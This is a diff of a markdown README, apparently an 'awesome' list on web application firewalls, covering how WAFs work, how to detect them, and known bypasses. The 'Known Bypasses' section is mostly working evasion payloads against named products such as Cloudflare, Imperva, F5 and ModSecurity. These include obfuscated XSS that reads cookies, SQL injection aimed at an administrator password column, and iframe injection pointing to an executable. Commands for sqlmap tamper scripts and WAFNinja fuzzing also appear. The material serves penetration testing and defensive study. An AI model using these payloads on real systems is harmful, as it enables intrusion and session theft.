@@ -18,85 +18,25 @@ Feel free to [contribute](CONTRIBUTING.md).
 - [Awesome Blogs & Writeups](#blogs-and-writeups)
 - [Awesome Presentations & Papers](#presentations--research-papers)
 
-## Awesome WAFs List
-Here are all commonly known WAFs:
-
-<table>
-    <tr>
-        <td>
-            <a href="http://360.cn">360 WangZhanBao</a>
-        </td>
-        <td>
-            <a href="https://www.airlock.com/products/airlock-waf/">Airlock</a>
-        </td>
-    </tr>
-    <tr>
-        <td>
-            <a href="http://www.anquanbao.com">Anquanbao</a>
-        </td>
-        <td>
-            <a href="https://www.armor.com/armor-web-application-firewall-service">Armor</a>
-        </td>
-    </tr>
-    <tr>
-        <td>
-            <a href="https://f5.com/products/big-ip/application-security-manager-asm">Application Security Manager</a>
-        </td>
-        <td>
-            <a href="https://aws.amazon.com/waf/">Amazon AWS WAF</a>
-        </td>
-    </tr>
-    <tr>
-        <td>
-            <a href="https://cloud.baidu.com">Baidu Cloud WAF</a>
-        </td>
-        <td>
-            <a href="https://www.barracuda.com/products/webapplicationfirewall">Barracuda</a>
-        </td>
-    </tr>
-    <tr>
-        <td>
-            <a href="http://binarysec.org">BinarySec</a>
-        </td>
-        <td>
-            <a href="https://www.blockdos.net">BlockDoS</a>
-        </td>
-    </tr>
-    <tr>
-        <td>
-            <a href="https://en.chinacache.com/managed-web-application-firewall/">ChinaCache</a>
-        </td>
-        <td>
-            
-        </td>
-    </tr>
-</table>
-
-
-## Testing Methodology
-Alright, now lets see the approach of testing WAFs. Wait, before that we need to know how they work right? Here you go.
-
-### How WAFs Work:
+## How WAFs Work:
 - Using a set of rules to distinguish between normal requests and malicious requests.
 - Sometimes they use a learning mode to add rules automatically through learning about user behaviour.
 
-### Operation Modes:
-- __Negative Model (Blacklist based)__ - 
-One that defines what is not allowed. Eg. Block all `<script>*</script>` inputs.
-- __Positive Model (Whitelist based)__ - 
-One that defines what is allowed and rejects everything else.
-- __Mixed/Hybrid Model (Inclusive model)__ -
-One that uses a mixed concept of blacklisting and whitelisting stuff.
+## Operation Modes:
+- __Negative Model (Blacklist based)__ - A blacklisting model uses pre-set signatures to block web traffic that is clearly malicious, and signatures designed to prevent attacks which exploit certain website and web application vulnerabilities. For example, if a number of IP addresses send a lot more packets than is typical for that many IP addresses being used to surf a website, a blacklisting firewall can effectively prevent DDoS attacks. Blacklisting model web application firewalls are a great choice for websites and web applications on the public internet, because those targets can get a lot of legitimate web traffic from unfamiliar client machines. Eg. Block all `<script>*</script>` inputs.
+- __Positive Model (Whitelist based)__ - A whitelisting model only allows web traffic according to specifically configured criteria. For example, it can be configured to only allow HTTP GET requests from certain IP addresses. This model can be very effective for casting a wide metaphorical fishing net for blocking possible cyber-attacks, but just as fishing nets also catch a lot of matter that a fisherman can't sell, whitelisting will block a lot of legitimate traffic. Whitelisting model firewalls are probably best for web applications on an internal network that are designed to be used by only a limited group of people, such as employees.
+- __Mixed/Hybrid Model (Inclusive model)__ - A hybrid security model is one that blends both whitelisting and blacklisting. Depending on all sorts of configuration specifics, hybrid firewalls could be the best choice for both web applications on internal networks and web applications on the public internet.
 
+## Testing Methodology:
 ### Where To Look:
 - Always look out for common ports that expose that a WAF `80`, `443`, `8000`, `8008`, `8080`, `8088`.
     > __Tip:__ You can use automate this easily by commandline using a screenshot taker like [WebScreenShot](https://github.com/maaaaz/webscreenshot).
 - Some WAFs set their own cookies in requests (eg. Citrix Netscaler, Yunsuo WAF).
 - Some associate themselves with separate headers (eg. Anquanbao WAF, Amazon AWS WAF). 
-- Some often alter headers and jumble characters to confuse attacker (eg. Citrix Netscaler, Big IP WAF).
-- Some (often rare) expose themselves in the `Server` header (eg. Approach WAF).
+- Some often alter headers and jumble characters to confuse attacker (eg. Citrix Netscaler, F5 Big IP).
+- Some (often rare) expose themselves in the `Server` header (eg. Approach, WTS WAF).
 - Some WAFs expose themselves in the response content (eg. DotDefender, Armor, Sitelock).
-- Other WAFs reply with unusual response codes upon malicious requests (eg. WebKnight).
+- Other WAFs reply with unusual response codes upon malicious requests (eg. WebKnight, 360 WAF).
 
 ### Detection Techniques:
 1. Make a normal GET request from a browser, intercept and test response headers (specifically cookies).
@@ -1611,15 +1551,28 @@ script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert(1)"></script a=\u0
 ```
 
 ## Google Dorks Approach:
+__Method:__
+- There are a lot of known bypasses of various web application firewalls ([see section](#known-bypasses)).
+- With the help of google dorks, we can easily find bypasses.
+
+__Techniques:__  
+Before anything else, its time to [hone up our skills via Google Dorks Cheat Sheet](http://pdf.textfiles.com/security/googlehackers.pdf).
+##### Step 1:
+Normal search:  
+`<wafname> waf bypass`
+
+##### Step 2:
+
 
 ## Known Bypasses:
-- __Cloudflare__ - Cross Site Scripting _([Source1](https://twitter.com/ArbazKiraak/status/1090654066986823680), [Source2](https://twitter.com/LooseSecurity/status/1094615936223625216?s=20))_
+### __Cloudflare__ 
+- Cross Site Scripting _([Source1](https://twitter.com/ArbazKiraak/status/1090654066986823680), [Source2](https://twitter.com/LooseSecurity/status/1094615936223625216?s=20))_
 ```
 <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;this['document']['cookie']&rpar;">X</a>
 <iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)">
 ```
 
-- __Imperva SecureSphere__ 
+### __Imperva SecureSphere__ 
 * Cross Site Scripting _([Source](https://waf.ninja/review-wafninja/))_
 ```
 %3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%2523x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%2526%2523x29%3B%22%3E
@@ -1629,7 +1582,8 @@ script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert(1)"></script a=\u0
 15 and '1'=(SELECT '1' FROM dual) and '0having'='0having'
 stringindatasetchoosen%%' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS where FULL_NAME like '%%dministrator' and rownum<=1 and PASSWORD like '0%') and '1%%'='1
 ```
-- __Barracuda__ 
+
+### __Barracuda__ 
 - Cross Site Scripting _([Source](https://waf.ninja/review-wafninja/))_
 ```
 <body style="height:1000px" onwheel="alert(1)">
@@ -1640,7 +1594,9 @@ stringindatasetchoosen%%' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS 
 ```
 /cgi-mod/index.cgi?&primary_tab=ADVANCED&secondary_tab=test_backup_server&content_only=1&&&backup_port=21&&backup_username=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_type=ftp&&backup_life=5&&backup_server=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_path=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_password=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net%20width%3D800%20height%3D800%3E&&user=guest&&password=121c34d4e85dfe6758f31ce2d7b763e7&&et=1261217792&&locale=en_US
 ```
-- __dotDefender__ - Cross Site Scripting _([Source](https://waf.ninja/review-wafninja/))_
+
+### __DotDefender__  
+- Reflected Cross Site Scripting _([Source](https://waf.ninja/review-wafninja/))_
 ```
 <svg/onload=prompt(1);>
 <isindex action="javas&tab;cript:alert(1)" type=image>
@@ -1660,19 +1616,22 @@ h%2Bn)(/0wn3d/.source)" />
 .source)" />
 ```
 
-- __Fortiweb__ - Cross Site Scripting _([Source](https://www.exploit-db.com/exploits/38100))_
+### __Fortiweb__  
+- Cross Site Scripting _([Source](https://www.exploit-db.com/exploits/38100))_
 ```
 /waf/pcre_expression/validate?redir=/success&mkey=0%22%3E%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28%22VL%22%29%20%3C
 /waf/pcre_expression/validate?redir=/success%20%22%3E%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28%22VL%22%29%20%3C&mkey=0 
 ```
 
-- __F5 ASM__ - Cross Site Scripting _([Source](https://waf.ninja/review-wafninja/))_
+### __F5 ASM__ 
+- Cross Site Scripting _([Source](https://waf.ninja/review-wafninja/))_
 ```
 <table background="javascript:alert(1)"></table>
 "/><marquee onfinish=confirm(123)>a</marquee>
 ```
 
-- __f5 BIG-IP__ - Cross Site Scripting _([Source](https://waf.ninja/review-wafninja/))_
+### __F5 BIG-IP__ 
+- Cross Site Scripting _([Source](https://waf.ninja/review-wafninja/))_
 ```
 <body style="height:1000px" onwheel="[DATA]">
 <div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[DATA]">
@@ -1680,14 +1639,16 @@ h%2Bn)(/0wn3d/.source)" />
 <div contextmenu="xss">Right-Click Here<menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)">
 ```
 
-- __ModSecurity__ - Cross Site Scripting _([Source](https://waf.ninja/review-wafninja/))_
+### __ModSecurity__ 
+- Cross Site Scripting _([Source](https://waf.ninja/review-wafninja/))_
 ```
 <a/onmouseover[\x0b]=location='\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B'>
 <object%00something allowScriptAccess=always data=//0me.me/demo/xss/flash/normalEmbededXSS.swf?
 <b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>
 ```
 
-- __Citrix NetScaler NS10.5__ - HTTP Parameter Pollution _([Source](https://www.exploit-db.com/exploits/36369))_
+### __Citrix NetScaler NS10.5__ 
+- HTTP Parameter Pollution _([Source](https://www.exploit-db.com/exploits/36369))_
 ```
 <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
    <soapenv:Header/>
@@ -1697,7 +1658,8 @@ h%2Bn)(/0wn3d/.source)" />
 </soapenv:Envelope>
 ```
 
-- __WebKnight__ - Cross Site Scripting _([Source](https://waf.ninja/review-wafninja/))_
+### __WebKnight__ 
+- Cross Site Scripting _([Source](https://waf.ninja/review-wafninja/))_
 ```
 <isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>
 <marquee/onstart=confirm(2)>
@@ -1705,20 +1667,23 @@ h%2Bn)(/0wn3d/.source)" />
 <div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
 ```
 
-- __QuickDefense__ - Cross Site Scripting _([Source](https://waf.ninja/review-wafninja/))_
+### __QuickDefense__ 
+- Cross Site Scripting _([Source](https://waf.ninja/review-wafninja/))_
 ```
 ?<input type="search" onsearch="aler\u0074(1)">
 <details ontoggle=alert(1)>
 ```
 
-- __Apache__ - Writing method type in lowercase. _([Source](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet))_
+### __Apache__ 
+- Writing method type in lowercase. _([Source](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet))_
 ```
 get /login HTTP/1.1
 Host: favoritewaf.com
 User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
 ```
 
-- __IIS__ - Tabs before method _([Source](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet))_
+### __IIS__ 
+- Tabs before method _([Source](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet))_
 ```
     GET /login.php HTTP/1.1
 Host: favoritewaf.com
@@ -1728,7 +1693,7 @@ User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
 ## Awesome Tools
 ### WAF Fingerprinting:
 __1. Fingerprinting with [NMap](https://nmap.org)__:  
-__Source:__ [GitHub](https://github.com/nmap/nmap) | [SVN](http://svn.nmap.org)
+Source: [GitHub](https://github.com/nmap/nmap) | [SVN](http://svn.nmap.org)
 - Normal WAF Fingerprinting
 
 ```
@@ -1744,7 +1709,7 @@ nmap --script=http-waf-detect <target>
 ```
 
 __2. Fingerprinting with [WafW00f](https://github.com/EnableSecurity/wafw00f)__:  
-__Source:__ [GitHub](https://github.com/enablesecurity/wafw00f) | [Pypi](https://pypi.org/project/wafw00f)
+Source: [GitHub](https://github.com/enablesecurity/wafw00f) | [Pypi](https://pypi.org/project/wafw00f)
 ```
 wafw00f <target>
 ```
@@ -1773,7 +1738,7 @@ sqlmap -u <target> --level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostro
 ```
 
 __2. Evading WAFs with [WAFNinja](https://waf.ninja/)__  
-__Source:__ [GitHub](https://github.com/khalilbijjou/wafninja)
+Source: [GitHub](https://github.com/khalilbijjou/wafninja)
 - Fuzzing
 ```
 python wafninja.py fuzz -u <target> -t xss
@@ -1806,7 +1771,7 @@ X-Remote-Addr: 127.0.0.1
 - Modify the scope to include applicable tools and URLs.
 - Configure the bypass options on the "Bypass WAF" tab.
 
-## Blogs and Write-ups
+## Blogs and Writeups
 - [Web Application Firewall (WAF) Evasion Techniques #1](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8) - By [@Secjuice](https://www.secjuice.com)
 - [Web Application Firewall (WAF) Evasion Techniques #2](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0) - By [@Secjuice](https://www.secjuice.com)
 - [Web Application Firewall (WAF) Evasion Techniques #3](https://www.secjuice.com/web-application-firewall-waf-evasion/) - By [@Secjuice](https://www.secjuice.com)
